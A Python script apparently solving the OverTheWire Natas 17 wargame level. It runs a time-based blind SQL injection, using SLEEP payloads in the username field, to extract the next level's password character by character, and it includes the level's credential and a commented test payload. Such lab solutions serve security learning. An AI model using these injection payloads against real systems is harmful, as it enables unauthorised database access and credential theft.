import requests

url = "http://natas17.natas.labs.overthewire.org/"
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"  #Password for Natas17

# Characters to test (alphanumeric + some special characters)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Placeholder for the extracted password
extracted_password = ""

# Loop through each character position
for i in range(1, 33):  # Assuming the password is 32 characters long
    for char in charset:
        # Construct the payload
        payload = f'natas18" AND IF(password LIKE BINARY "{extracted_password}{char}%", SLEEP(2), 0) -- '
        data = {"username": payload}

        # Send the request
        response = requests.post(url, auth=(username, password), data=data)

        #Measure response time
        elapsed_time = response.elapsed.total_seconds()

        # If the response time > 2, char is correct
        if elapsed_time > 2:
            extracted_password += char
            print(f"Response took {elapsed_time:.2f} seconds\nExtracted: {extracted_password}")
            break
        
print(f"Final password: {extracted_password}")


"""

#Test payload to check if response.elapsed.total_seconds() can work here
payload = f'natas18" AND IF(ASCII(SUBSTRING(password,1,1)) < 77, SLEEP(2), 0) -- '
data = {"username": payload}
response = requests.post(url, auth=(username, password), data=data)
elapsed_time = response.elapsed.total_seconds()
if elapsed_time > 2:
    print(f"[+] Possible SQLi! Response took {elapsed_time:.2f} seconds.")
else:
    print(f"[-] No delay detected: {elapsed_time:.2f} seconds.")

"""